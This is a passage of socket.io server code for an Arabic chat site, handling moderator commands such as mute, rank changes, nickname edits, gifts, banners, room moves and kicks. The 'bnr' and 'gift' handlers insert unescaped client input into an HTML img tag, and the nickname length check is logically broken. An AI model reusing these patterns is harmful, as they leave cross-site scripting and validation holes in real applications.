                    UserInfo[data["data"]["id"]]["ismuted"];
                  io.emit("SEND_EVENT_EMIT_SERVER", {
                    cmd: "u^",
                    data: OnlineUser[ismue],
                  });
                  UserMuted.push(UserInfo[data["data"]["id"]]["device"]);
                  if (UserInfo[data["data"]["id"]]["uid"]) {
                    UsersRepo.updateBy({
                      state: "updateMute",
                      muted: UserInfo[data["data"]["id"]]["ismuted"],
                      uid: UserInfo[data["data"]["id"]]["uid"],
                    });
                  }
                }
                if (UserInfo[data["data"]["id"]]["ismuted"] == false) {
                  UserMuted.splice(
                    UserMuted.findIndex(
                      (v) => v == UserInfo[data["data"]["id"]]["device"]
                    ),
                    1
                  );
                }
                SaveStats({
                  state: UserInfo[data["data"]["id"]]["ismuted"]
                    ? "إسكات"
                    : "إلغاءإسكات",
                  topic: UserInfo[socket.id]["topic"],
                  ip: UserInfo[socket.id]["ip"],
                  username: UserInfo[data["data"]["id"]]["topic"],
                  room: UserInfo[data["data"]["id"]]["idroom"]
                    ? GetRoomList(UserInfo[data["data"]["id"]]["idroom"])[
                        "topic"
                      ]
                    : "out room",
                  time: new Date().getTime(),
                });

                socket.to(data["data"]["id"]).emit("SEND_EVENT_EMIT_SERVER", {
                  cmd: "muted",
                  data: {
                    id: data["data"]["id"],
                    lid: UserInfo[data["data"]["id"]]["lid"],
                    uid: data["data"]["id"],
                    ism: UserInfo[data["data"]["id"]]["ismuted"],
                    topic: UserInfo[data["data"]["id"]]["topic"],
                  },
                });
              } else if (data["data"]["cmd"] == "meiutbc") {
                if (!GetPower(UserInfo[socket.id]["power"])["meiut"]) {
                  return;
                } else if (
                  GetPower(UserInfo[data["data"]["id"]]["power"])["rank"] >
                  GetPower(UserInfo[socket.id]["power"])["rank"]
                ) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "هذا المستخدم اعلى منك رتبة",
                    user: "",
                  });
                  return;
                }
                if (UserInfo[data["data"]["id"]]["ismutedbc"]) {
                  UserInfo[data["data"]["id"]]["ismutedbc"] = false;
                } else {
                  UserInfo[data["data"]["id"]]["ismutedbc"] = true;
                }
                SendNotification({
                  id: data["data"]["id"],
                  state: "to",
                  topic: "",
                  force: 1,
                  msg: UserInfo[data["data"]["id"]]["ismutedbc"]
                    ? "تم منعك من الحديث في الحائط"
                    : "تم السماح لك بالحديث في الحائط",
                  user: "",
                });
                const ismue = OnlineUser.findIndex(
                  (x) => x.id == data["data"]["id"]
                );
                if (ismue != -1) {
                  OnlineUser[ismue]["meiutbc"] =
                    UserInfo[data["data"]["id"]]["ismutedbc"];
                  io.emit("SEND_EVENT_EMIT_SERVER", {
                    cmd: "u^",
                    data: OnlineUser[ismue],
                  });
                }

                if (UserInfo[data["data"]["id"]]["ismutedbc"] == false) {
                  const isbnd = Bandbc.findIndex(
                    (v) => v == UserInfo[data["data"]["id"]]["device"]
                  );
                  if (isbnd != -1) {
                    Bandbc.splice(isbnd, 1);
                  }
                } else {
                  Bandbc.push(UserInfo[data["data"]["id"]]["device"]);
                }
                SaveStats({
                  state: UserInfo[data["data"]["id"]]["ismutedbc"]
                    ? "إسكات حائط"
                    : "إلغاءإسكات حائط",
                  topic: UserInfo[socket.id]["topic"],
                  ip: UserInfo[socket.id]["ip"],
                  username: UserInfo[data["data"]["id"]]["topic"],
                  room: UserInfo[data["data"]["id"]]["idroom"]
                    ? GetRoomList(UserInfo[data["data"]["id"]]["idroom"])[
                        "topic"
                      ]
                    : "out room",
                  time: new Date().getTime(),
                });
                socket.to(data["data"]["id"]).emit("SEND_EVENT_EMIT_SERVER", {
                  cmd: "mutedbc",
                  data: { ism: UserInfo[data["data"]["id"]]["ismutedbc"] },
                });
                
              } else if (data["data"]["cmd"] == "delpic") {
                if (!GetPower(UserInfo[socket.id]["power"])["delpic"]) {
                  return;
                } else if (
                  GetPower(UserInfo[data["data"]["id"]]["power"])["rank"] >
                  GetPower(UserInfo[socket.id]["power"])["rank"]
                ) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "هذا المستخدم اعلى منك رتبة",
                    user: "",
                  });
                  return;
                }
                const idpic = getRandomInt(1, 100);
                SendNotification({
                  id: data["data"]["id"],
                  state: "to",
                  topic: "",
                  force: 1,
                  msg: "تم حذف صورتك",
                  user: "",
                });
                SaveStats({
                  state: "حذف صورة",
                  topic: UserInfo[socket.id]["topic"],
                  ip: UserInfo[socket.id]["ip"],
                  username: UserInfo[data["data"]["id"]]["topic"],
                  room: UserInfo[data["data"]["id"]]["idroom"]
                    ? GetRoomList(UserInfo[data["data"]["id"]]["idroom"])[
                        "topic"
                      ]
                    : "out room",
                  time: new Date().getTime(),
                });
                const uppic = OnlineUser.findIndex(
                  (x) => x.id == data["data"]["id"]
                );
                if (uppic != -1) {
                  UserInfo[data["data"]["id"]]["pic"] =
                    "/site/pic.png?z" + idpic;
                  OnlineUser[uppic]["pic"] = "/site/pic.png?z" + idpic;
                  io.emit("SEND_EVENT_EMIT_SERVER", {
                    cmd: "u^",
                    data: OnlineUser[uppic],
                  });
                  if (UserInfo[data["data"]["id"]]["uid"]) {
                    UsersRepo.updateBy({
                      state: "updatePic",
                      uid: UserInfo[data["data"]["id"]]["uid"],
                      pic: "/site/pic.png?z" + idpic,
                    });
                  }
                }
              } else if (data["data"]["cmd"] == "setLikes") {
                if (typeof data["data"]["likes"] != "number") {
                  return;
                } else if (!GetPower(UserInfo[socket.id]["power"])["ulike"]) {
                  return;
                } else if (
                  GetPower(UserInfo[data["data"]["id"]]["power"])["rank"] >
                  GetPower(UserInfo[socket.id]["power"])["rank"]
                ) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "هذا المستخدم اعلى منك رتبة",
                    user: "",
                  });
                  return;
                } else if (data["data"]["likes"] > 9223372036854775806) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "الحد الاقصى للايكات 9223372036854775806",
                    user: "",
                  });
                  return;
                }
                SendNotification({
                  id: data["data"]["id"],
                  state: "to",
                  topic: "",
                  force: 1,
                  msg: " تم تغير إعجاباتك الى ↵ " + data["data"]["likes"],
                  user: socket.id,
                });

                SaveStats({
                  state: "تعديل اعجابات",
                  topic: UserInfo[socket.id]["topic"],
                  ip: UserInfo[socket.id]["ip"],
                  username: UserInfo[data["data"]["id"]]["topic"],
                  room: UserInfo[data["data"]["id"]]["idroom"]
                    ? GetRoomList(UserInfo[data["data"]["id"]]["idroom"])[
                        "topic"
                      ]
                    : "out room",
                  time: new Date().getTime(),
                });

                const uplike = OnlineUser.findIndex(
                  (x) => x.id == data["data"]["id"]
                );
                if (uplike != -1) {
                  UserInfo[data["data"]["id"]]["rep"] = data["data"]["likes"];
                  OnlineUser[uplike]["rep"] = data["data"]["likes"];
                  UsersRepo.updateBy({
                    state: "updateRep",
                    rep: data["data"]["likes"],
                    uid: UserInfo[data["data"]["id"]]["uid"],
                  });
                  io.emit("SEND_EVENT_EMIT_SERVER", {
                    cmd: "u^",
                    data: OnlineUser[uplike],
                  });
                }
              } else if (data["data"]["cmd"] == "setEvaluation") {
                if (typeof data["data"]["eva"] != "number") {
                  return;
                } else if (
                  GetPower(UserInfo[data["data"]["id"]]["power"])["rank"] >
                  GetPower(UserInfo[socket.id]["power"])["rank"]
                ) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "هذا المستخدم اعلى منك رتبة",
                    user: "",
                  });
                  return;
                } else if (data["data"]["eva"] > 50000) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "الحد الاقصى للنقاط 50000",
                    user: "",
                  });
                  return;
                }
                if (
                  UserInfo[socket.id]["power"] == "gochat" ||
                  UserInfo[socket.id]["power"] == "Hide" ||
                  UserInfo[socket.id]["power"] == "chatmaster"
                ) {
                  SendNotification({
                    id: data["data"]["id"],
                    state: "to",
                    topic: "",
                    force: 1,
                    msg: " تم تغير نقاط الى ↵ " + data["data"]["eva"],
                    user: socket.id,
                  });

                  SaveStats({
                    state: "تعديل نقاط",
                    topic: UserInfo[socket.id]["topic"],
                    ip: UserInfo[socket.id]["ip"],
                    username: UserInfo[data["data"]["id"]]["topic"],
                    room: UserInfo[data["data"]["id"]]["idroom"]
                      ? GetRoomList(UserInfo[data["data"]["id"]]["idroom"])[
                          "topic"
                        ]
                      : "out room",
                    time: new Date().getTime(),
                  });

                  const uplike = OnlineUser.findIndex(
                    (x) => x.id == data["data"]["id"]
                  );
                  if (uplike != -1) {
                    UserInfo[data["data"]["id"]]["evaluation"] =
                      data["data"]["eva"];
                    OnlineUser[uplike]["evaluation"] = data["data"]["eva"];
                    io.emit("SEND_EVENT_EMIT_SERVER", {
                      cmd: "u^",
                      data: OnlineUser[uplike],
                    });
                    if (UserInfo[data["data"]["id"]]["uid"]) {
                      UsersRepo.updateBy({
                        state: "updateLike",
                        evaluation: data["data"]["eva"],
                        uid: UserInfo[data["data"]["id"]]["uid"],
                      });
                    }
                  }
                }
              } else if (data["data"]["cmd"] == "setpower") {
                if (!GetPower(UserInfo[socket.id]["power"])["setpower"]) {
                    return;
                } else if (
                    GetPower(UserInfo[data["data"]["id"]]["power"])["rank"] >
                    GetPower(UserInfo[socket.id]["power"])["rank"]
                ) {
                    SendNotification({
                        state: "me",
                        topic: "",
                        force: 1,
                        msg: "هذا المستخدم أعلى منك رتبة",
                        user: "",
                    });
                    return;
                } else if (data['data']["id"] == socket.id) {
                    SendNotification({
                        state: 'me',
                        topic: "",
                        force: 1,
                        msg: "لا يمكنك ترقية نفسك",
                        user: ""
                    });
                    return;
                }
                if (UserInfo[data["data"]["id"]]["power"]) {
                    if (UserInfo[data["data"]["id"]]["uid"] && data["data"]["power"] < UserInfo[data["data"]["id"]]["power"]) {
                        SubRepo.update({
                            sub: data["data"]["power"],
                            timefinish: addDays(data["data"]["days"] || 0),
                            timestart: new Date().getTime().toFixed(),
                            timeis: data["data"]["days"] || 0,
                            topic: UserInfo[data["data"]["id"]]["topic"],
                            username: UserInfo[data["data"]["id"]]["username"],
                        });
                               
                  } if (!data["data"]["power"]) {
                    SubRepo.deleted(UserInfo[data["data"]["id"]]["username"]);
                    SendNotification({
                      state: "me",
                      topic: "",
                      force: 1,
                      msg: "تم تنزيل رتبة المستخدم",
                      user: "",
                    });
                    SendNotification({
                      id: data["data"]["id"],
                      state: "to",
                      topic: "",
                      force: 1,
                      msg: "تم تنزيل رتبتك",
                      user: "",
                    });
                  } else {
                    SendNotification({
                      state: "me",
                      topic: "",
                      force: 1,
                      msg: "تم ترقية المستخدم الى 》 " + data["data"]["power"],
                      user: "",
                    });
                    SendNotification({
                      id: data["data"]["id"],
                      state: "to",
                      topic: "",
                      force: 1,
                      msg: "اصبحت ترقيتك 》 " + data["data"]["power"],
                      user: "",
                    });
                  }
                } else {
                  if (UserInfo[data["data"]["id"]]["uid"]) {
                    SubRepo.create({
                      sub: data["data"]["power"],
                      topic: UserInfo[data["data"]["id"]]["username"],
                      username: UserInfo[data["data"]["id"]]["username"],
                      timefinish: addDays(data["data"]["days"] || 0),
                      timestart: new Date().getTime().toFixed(),
                      timeis: data["data"]["days"] || 0,
                    });
                  }
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "تم ترقية المستخدم الى 》 " + data["data"]["power"],
                    user: "",
                  });
                  SendNotification({
                    id: data["data"]["id"],
                    state: "to",
                    topic: "",
                    force: 1,
                    msg: "اصبحت ترقيتك 》 " + data["data"]["power"],
                    user: "",
                  });
                }

                const pwr = ShowPowers.findIndex(
                  (x) => x.name == data["data"]["power"]
                );
                if (pwr != -1) {
                  socket.to(data["data"]["id"]).emit("SEND_EVENT_EMIT_SERVER", {
                    cmd: "power",
                    data: ShowPowers[pwr],
                  });
                } else {
                  socket.to(data["data"]["id"]).emit("SEND_EVENT_EMIT_SERVER", {
                    cmd: "power",
                    data: Config.PowerNon,
                  });
                }

                SaveStats({
                  state: "ترقية",
                  topic: UserInfo[socket.id]["username"],
                  ip: UserInfo[socket.id]["ip"],
                  username:
                    UserInfo[data["data"]["id"]]["topic"] +
                    "[" +
                    data["data"]["power"] +
                    "]",
                  room: data["data"]["power"],
                  time: new Date().getTime(),
                });
                const inme = OnlineUser.findIndex(
                  (x) => x.id == data["data"]["id"]
                );
                if (inme != -1) {
                  UserInfo[data["data"]["id"]]["power"] = data["data"]["power"];
                  OnlineUser[inme]["power"] = data["data"]["power"];
                  io.emit("SEND_EVENT_EMIT_SERVER", {
                    cmd: "u^",
                    data: OnlineUser[inme],
                  });
                  if (UserInfo[data["data"]["id"]]["uid"]) {
                    UsersRepo.updateBy({
                      state: "updatePower",
                      uid: UserInfo[data["data"]["id"]]["uid"],
                      power: data["data"]["power"].split("<").join("&#x3C;"),
                    });
                  }
                }
             } else if (data["data"]["cmd"] == "setmsg"){
                if (typeof data["data"]["msg"] != "string") {
                  return;
                }
                 else if (
                  !GetPower(UserInfo[socket.id]["power"])["edituser"]
                ) {
                  return;
                } else if (
                  GetPower(UserInfo[data["data"]["id"]]["power"])["rank"] >
                  GetPower(UserInfo[socket.id]["power"])["rank"]
                ) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "هذا المستخدم اعلى منك رتبة",
                    user: "",
                  });
                  return;
                } else if (data["data"]["msg"].length > 240) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "لا يجب ان تتجاوز الحاله 240 حرفا",
                    user: "",
                  });
                  return;
                }
                SendNotification({
                  id: data["data"]["id"],
                  state: "to",
                  topic: "",
                  force: 1,
                  msg: "تم تغيير حالتك",
                  user: "",
                });

                SaveStats({
                  state: "تعديل حاله",
                  topic: UserInfo[socket.id]["topic"],
                  ip: UserInfo[socket.id]["ip"],
                  username: UserInfo[data["data"]["id"]]["topic"],
                  room: UserInfo[data["data"]["id"]]["idroom"]
                    ? GetRoomList(UserInfo[data["data"]["id"]]["idroom"])[
                        "topic"
                      ]
                    : "out room",
                  time: new Date().getTime(),
                });

                const upmsg = OnlineUser.findIndex(
                  (x) => x.id == data["data"]["id"]
                );
                if (upmsg != -1) {
                  UserInfo[data["data"]["id"]]["msg"] = ReplaceEktisar(
                    data["data"]["msg"]
                  );
                  OnlineUser[upmsg]["msg"] = ReplaceEktisar(
                    data["data"]["msg"]
                  );
                  io.emit("SEND_EVENT_EMIT_SERVER", {
                    cmd: "u^",
                    data: OnlineUser[upmsg],
                  });
                  if (UserInfo[data["data"]["id"]]["uid"]) {
                    UsersRepo.updateBy({
                      state: "updateMsg",
                      uid: UserInfo[data["data"]["id"]]["uid"],
                      msg: ReplaceEktisar(data["data"]["msg"]),
                    });
                  }
                }
              } else if (data["data"]["cmd"] == "setyou") {
              if (typeof data["data"]["youtube"] != "string") {
                return;
              }
               else if (
                !GetPower(UserInfo[socket.id]["power"])["edituser"]
              ) {
                return;
              } else if (
                GetPower(UserInfo[data["data"]["id"]]["power"])["rank"] >
                GetPower(UserInfo[socket.id]["power"])["rank"]
              ) {
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg: "هذا المستخدم اعلى منك رتبة",
                  user: "",
                });
                return;
              } 
              SendNotification({
                id: data["data"]["id"],
                state: "to",
                topic: "",
                force: 1,
                msg: "تم تغيير رابط اليوتيوب",
                user: "",
              });

              SaveStats({
                state: "تعديل رابط يوتيوب",
                topic: UserInfo[socket.id]["topic"],
                ip: UserInfo[socket.id]["ip"],
                username: UserInfo[data["data"]["id"]]["topic"],
                room: UserInfo[data["data"]["id"]]["idroom"]
                  ? GetRoomList(UserInfo[data["data"]["id"]]["idroom"])[
                      "topic"
                    ]
                  : "out room",
                time: new Date().getTime(),
              });

              const picup = OnlineUser.findIndex(
                (x) => x.id == data["data"]["id"]
              );
              if (picup != -1) {
                UserInfo[data["data"]["id"]]["youtube"] = ReplaceEktisar(
                  data["data"]["youtube"]
                );
                OnlineUser[picup]["youtube"] = ReplaceEktisar(
                  data["data"]["youtube"]
                );
                io.emit("SEND_EVENT_EMIT_SERVER", {
                  cmd: "u^",
                  data: OnlineUser[picup],
                });
                if (UserInfo[data["data"]["id"]]["uid"]) {
                  UsersRepo.updateBy({
                    state: "updateYoutube",
                    uid: UserInfo[data["data"]["id"]]["uid"],
                    youtube: ReplaceEktisar(data["data"]["youtube"]),
                  });
                }
              }
            }
           
               else if (data["data"]["cmd"] == "unick") {
                if (typeof data["data"]["nick"] != "string") {
                  return;
                } else if (!GetPower(UserInfo[socket.id]["power"])["unick"]) {
                  return;
                } else if (
                  GetPower(UserInfo[data["data"]["id"]]["power"])["rank"] >
                  GetPower(UserInfo[socket.id]["power"])["rank"]
                ) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "هذا المستخدم اعلى منك رتبة",
                    user: "",
                  });
                  return;
                } else if (
                  data["data"]["nick"].length < 2 &&
                  data["data"]["nick"].length > 30
                ) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "لا يجب ان تكون الزخرفة اكثر من 30 حرف او اقل من 2 حرف",
                    user: "",
                  });
                  return;
                } else if (
                  isNaN(data["data"]["nick"]) == false ||
                  !data["data"]["nick"].trim()
                ) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "الرجاء التاكد من الزخرفة",
                    user: "",
                  });
                  return;
                }

                SendNotification({
                  id: data["data"]["id"],
                  state: "to",
                  topic: "",
                  force: 1,
                  msg: "تم تغيير زخرفتك الى > " + data["data"]["nick"],
                  user: "",
                });

                SaveStats({
                  state: "تعديل زخرفة",
                  topic: UserInfo[socket.id]["topic"],
                  ip: UserInfo[socket.id]["ip"],
                  username: UserInfo[data["data"]["id"]]["topic"],
                  room: data["data"]["nick"].split("<").join("&#x3C;"),
                  time: new Date().getTime(),
                });

                const uptopic = OnlineUser.findIndex(
                  (x) => x.id == data["data"]["id"]
                );
                if (uptopic != -1) {
                  UserInfo[data["data"]["id"]]["topic"] = data["data"]["nick"]
                    .split("<")
                    .join("&#x3C;");
                  OnlineUser[uptopic]["topic"] = data["data"]["nick"]
                    .split("<")
                    .join("&#x3C;");
                  io.emit("SEND_EVENT_EMIT_SERVER", {
                    cmd: "u^",
                    data: OnlineUser[uptopic],
                  });
                  if (UserInfo[data["data"]["id"]]["uid"]) {
                    UsersRepo.updateBy({
                      state: "updateName",
                      uid: UserInfo[data["data"]["id"]]["uid"],
                      topic: data["data"]["nick"].split("<").join("&#x3C;"),
                    });
                  }
                }
              } else if (data["data"]["cmd"] == "bnr") {
                if (!GetPower(UserInfo[socket.id]["power"])["ureport"]) {
                  return;
                }
                SendNotification({
                  id: data["data"]["id"],
                  state: "to",
                  topic: "",
                  force: 1,
                  msg: data["data"]["bnr"]
                    ? "بنر " +
                      "<img src=" +
                      "/sico/" +
                      data["data"]["bnr"] +
                      ">"
                    : "تم إزالة البنر",
                  user: socket.id,
                });
                SaveStats({
                  state: data["data"]["bnr"] ? "إعطاء بنر " : "إزالة بنر",
                  topic: UserInfo[socket.id]["topic"],
                  ip: UserInfo[socket.id]["ip"],
                  username: UserInfo[data["data"]["id"]]["topic"],
                  room: "",
                  time: new Date().getTime(),
                });

                const upgift = OnlineUser.findIndex(
                  (x) => x.id == data["data"]["id"]
                );
                if (upgift != -1) {
                  UserInfo[data["data"]["id"]]["ico"] = data["data"]["bnr"]
                    ? "/sico/" + data["data"]["bnr"]
                    : "";
                  OnlineUser[upgift]["ico"] = data["data"]["bnr"]
                    ? "/sico/" + data["data"]["bnr"]
                    : "";
                  io.emit("SEND_EVENT_EMIT_SERVER", {
                    cmd: "u^",
                    data: OnlineUser[upgift],
                  });
                  if (UserInfo[data["data"]["id"]]["uid"]) {
                    UsersRepo.updateBy({
                      state: "updateIco",
                      ico: data["data"]["bnr"]
                        ? "/sico/" + data["data"]["bnr"]
                        : "",
                      uid: UserInfo[data["data"]["id"]]["uid"],
                    });
                  }
                }
              } else if (data["data"]["cmd"] == "gift") {
                if (typeof data["data"]["gift"] != "string") {
                  return;
                } else if (
                  !GetPower(UserInfo[socket.id]["power"])["upgrades"]
                ) {
                  return;
                } else if (UserInfo[data["data"]["id"]]["power"] != "") {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "لا يمكنك ارسال هديه للسوبر",
                    user: "",
                  });
                  return;
                }
                SendNotification({
                  id: data["data"]["id"],
                  state: "to",
                  topic: "",
                  force: 1,
                  msg: data["data"]["gift"]
                    ? "هديه " +
                      "<img src=" +
                      "/dro3/" +
                      data["data"]["gift"] +
                      ">"
                    : "تم إزالة الهدية",
                  user: socket.id,
                });
                SaveStats({
                  state: data["data"]["gift"] ? "إعطاء هديه " : "إزالة الهدية",
                  topic: UserInfo[socket.id]["topic"],
                  ip: UserInfo[socket.id]["ip"],
                  username: UserInfo[data["data"]["id"]]["topic"],
                  room: "",
                  time: new Date().getTime(),
                });

                const upgift = OnlineUser.findIndex(
                  (x) => x.id == data["data"]["id"]
                );
                if (upgift != -1) {
                  UserInfo[data["data"]["id"]]["ico"] = data["data"]["gift"]
                    ? "/dro3/" + data["data"]["gift"]
                    : "";
                  OnlineUser[upgift]["ico"] = data["data"]["gift"]
                    ? "/dro3/" + data["data"]["gift"]
                    : "";
                  io.emit("SEND_EVENT_EMIT_SERVER", {
                    cmd: "u^",
                    data: OnlineUser[upgift],
                  });
                  if (UserInfo[data["data"]["id"]]["uid"]) {
                    UsersRepo.updateBy({
                      state: "updateIco",
                      ico: data["data"]["gift"]
                        ? "/dro3/" + data["data"]["gift"]
                        : "",
                      uid: UserInfo[data["data"]["id"]]["uid"],
                    });
                  }
                }
              } else if (data["data"]["cmd"] == "rinvite") {
                if (typeof data["data"]["rid"] != "string") {
                  return;
                } else if (!GetPower(UserInfo[socket.id]["power"])["loveu"]) {
                  return;
                } else if (
                  GetPower(UserInfo[data["data"]["id"]]["power"])["rank"] >
                  GetPower(UserInfo[socket.id]["power"])["rank"]
                ) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "هذا المستخدم اعلى منك رتبة",
                    user: "",
                  });
                  return;
                } else if (data["data"]["id"] == socket.id) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "لا يمكنك نقل نفسك",
                    user: "",
                  });
                  return;
                } else if (GetRoomList(data["data"]["rid"])["needpass"]) {
                  if (
                    GetRoomList(data["data"]["rid"])["pass"] !=
                    data["data"]["pwd"]
                  ) {
                    SendNotification({
                      state: "me",
                      topic: "",
                      force: 1,
                      msg: "الرقم السري لدخول الغرفة خاطئ",
                      user: "",
                    });
                    return;
                  }
                }
                SaveStats({
                  state: "نقل إلى غرفة",
                  topic: UserInfo[socket.id]["topic"],
                  ip: UserInfo[socket.id]["ip"],
                  username: UserInfo[data["data"]["id"]]["topic"],
                  room: GetRoomList(data["data"]["rid"])["topic"],
                  time: new Date().getTime(),
                });
                SendNotification({
                  id: data["data"]["id"],
                  state: "to",
                  topic: "",
                  force: 1,
                  msg:
                    " تم نقلك الى  " +
                    GetRoomList(data["data"]["rid"])["topic"],
                  user: "",
                });
                socket.to(data["data"]["id"]).emit("SEND_EVENT_EMIT_SERVER", {
                  cmd: "rjoinad",
                  data: {
                    rid: data["data"]["rid"],
                    pwd: data["data"]["pwd"],
                  },
                });
              } else if (data["data"]["cmd"] == "roomkick") {
                if (!GetPower(UserInfo[socket.id]["power"])["kick"]) {
                  return;
                } else if (
                  GetPower(UserInfo[data["data"]["id"]]["power"])["rank"] >
                  GetPower(UserInfo[socket.id]["power"])["rank"]
                ) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "هذا المستخدم اعلى منك رتبة",
                    user: "",
                  });
                  return;
                }
                SendNotification({
                  id: data["data"]["id"],
                  state: "to",
                  topic: "",
                  force: 1,
                  msg: "تم طردك من الغرفه",
                  user: "",
                });
                MessagesList({
                  state: "LogsMsg",
                  bg: "none",
                  copic: "none",
                  class: "hmsg",
                  id: data["data"]["id"],
                  topic: UserInfo[data["data"]["id"]]["topic"],
                  msg: "( هذا المستخدم تم طرده من الغرفة )",
                  idroom: UserInfo[data["data"]["id"]]["idroom"],
                  pic: UserInfo[data["data"]["id"]]["pic"],
                });
                SaveStats({
                  state: "طرد من الغرفة",
                  topic: UserInfo[socket.id]["topic"],
                  ip: UserInfo[socket.id]["ip"],
                  username: UserInfo[data["data"]["id"]]["topic"],
                  room: UserInfo[data["data"]["id"]]["idroom"]
                    ? GetRoomList(UserInfo[data["data"]["id"]]["idroom"])[
                        "topic"
                      ]
                    : "out room",
                  time: new Date().getTime(),
                });
                UserInfo[data["data"]["id"]]["kiked"] = true;
                BandRoom.push({
                  device: UserInfo[data["data"]["id"]]["device"],
                  room: UserInfo[data["data"]["id"]]["idroom"],
                });
                socket
                  .to(data["data"]["id"])
                  .emit("SEND_EVENT_EMIT_SERVER", { cmd: "lavedon", data: {} });
              } else if (data["data"]["cmd"] == "delpic") {
              } else if(data['data']['cmd'] == "reportes"){
                if (typeof data["data"]["msg"] != "string") {
                  return;
                }
                if(UserInfo[socket.id]){

                  MesgRepo.create({ v: "تبليغ", msg: data.data.msg, topic: UserInfo[socket.id].topic, topic2: UserInfo[data.data["id"]].topic})
                  FilterChat(data.data.msg);
              
                  return;
              }

				 }else if (data['data']["cmd"] == "likeit") {
								 	if(typeof data['data']['msg'] != 'number'){
										return;
								 	}else if(UserInfo[data['data']["id"]]['offline']){
									 SendNotification({state:'me',topic: "", force: 1, msg:"المستخدم غير متصل بالانترنت في الوقت الحالي", user: ""});						 									 
									 return;								 
								 };
								 
								 const istef = UserInfo[socket.id]['istef'].findIndex((x) => x == data['data']["id"]);
								 if(istef != -1){
									 SendNotification({state:'me',topic: "", force: 1, msg:'يمكنك ارسال حركة كل 1 دقيقة', user: ""});						 									 
									 return;
								 };
								     UserInfo[socket.id]['istef'].push(data['data']["id"]);
									 SendNotification({id:data['data']['id'],state:'to',topic:"", force: 1, msg:
									 data['data']['msg'] == 1 ? '❤️ أنـا أحٍـبَڪ ' :
									 data['data']['msg'] == 2 ? 'ههههههههههههههههههههههههههههههههههههههههههههههههه ' :
									 data['data']['msg'] == 3 ? '💋 أأأمـمـمـمـمـمـوأأااااحـح 💋' :
									 data['data']['msg'] == 4 ? '💦 اااااخخخختتتتتتفففففففففوووووووووووووووووووووو 💦' : ''
									 , user: socket.id});						
									 setTimeout(function () {
										  if (UserInfo[socket.id]) {
											  UserInfo[socket.id]['istef'].splice(UserInfo[socket.id]['istef'].findIndex((v) => v == data['data']['id']),1);
										  };
									 }, 60000);	
              } else if (data["data"]["cmd"] == "not") {
                if (typeof data["data"]["msg"] != "string") {
                  return;
                } else if (UserInfo[socket.id]["ismuted"]) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "إسكات",
                    user: "",
                  });
                  return;
                } else if (
                  UserInfo[socket.id]["rep"] < SiteSetting["maxlikealert"]
                ) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg:
                      SiteSetting["maxlikealert"] +
                      " عدد الايكات المطلوبة لارسال تنبيه ",
                    user: "",
                  });
                  return;
                }
                FilterChat(data["data"]["msg"]);
				     listalert.push({
			idreg:UserInfo[socket.id]['idreg'],
			bg:UserInfo[socket.id]['bg'],
			ucol:UserInfo[socket.id]['ucol'],
			pic:UserInfo[socket.id]['pic'],
			topic:UserInfo[socket.id]['topic'],
			msg:ReplaceEktisar(data['data']['msg']).slice(0, SiteSetting['lengthroom'])
			});
                SendNotification({
                  id: data["data"]["id"],
                  state: "to",
                  topic: "",
                  force: GetPower(UserInfo[socket.id]["power"])["alert"],
                  msg: ReplaceEktisar(data["data"]["msg"]).slice(
                    0,
                    SiteSetting["lengthroom"]
                  ),
                  user: socket.id,
                });
              }
            }
          }
        } else if (data["cmd"] == "SEND_EVENT_EMIT_ADD_ROOM") {
          if (UserInfo[socket.id]) {
            if (
              typeof data["data"]["broadcast"] == "boolean" &&
              typeof data["data"]["delete"] == "boolean" &&
              typeof data["data"]["nohide"] == "boolean" &&
              typeof data["data"]["camera"] == "boolean" &&
              typeof data["data"]["pic"] == "string" &&
              typeof data["data"]["topic"] == "string" &&
              typeof data["data"]["welcome"] == "string" &&
              typeof data["data"]["max"] == "number"
            ) {
              const isRoomTopic = RoomsList.findIndex(
                (x) => x.topic == data["data"]["topic"]
              );
              if (Config.maxRooms < RoomsList.length) {
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg: "تم إنشاء الحد الاقصى لرومات",
                  user: "",
                });
                return;
              } else if (
                !GetPower(UserInfo[socket.id]["power"])["createroom"]
              ) {
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg: "لا تملك صلاحية",
                  user: "",
                });
                return;
              } else if (data["data"]["max"] > 1000 || data["data"]["max"] < 2) {
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg: "يجب ان يكون عدداعظاء الروم لا يزيد عن 40 او اقل من 2",
                  user: "",
                });
                return;
              } else if (isRoomTopic != -1) {
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg: "يوجد غرفة تحمل نفس الاسم",
                  user: "",
                });
                return;
              }
              const idroom = stringGen(10);
              CreateRooms({
                id: idroom,
                about: data["data"]["about"]
                  ? data["data"]["about"].split("<").join("&#x3C;")
                  : "",
                user: UserInfo[socket.id]["username"],
                pass: data["data"]["pass"],
                color: data["data"]["color"].split("<").join("&#x3C;") || "#FFFFFF",
                  colorpicroom: data["data"]["colorpicroom"].split("<").join("&#x3C;") || "#FFFFFF",
                  colormsgroom: data["data"]["colormsgroom"].split("<").join("&#x3C;") || "#FFFFFF",
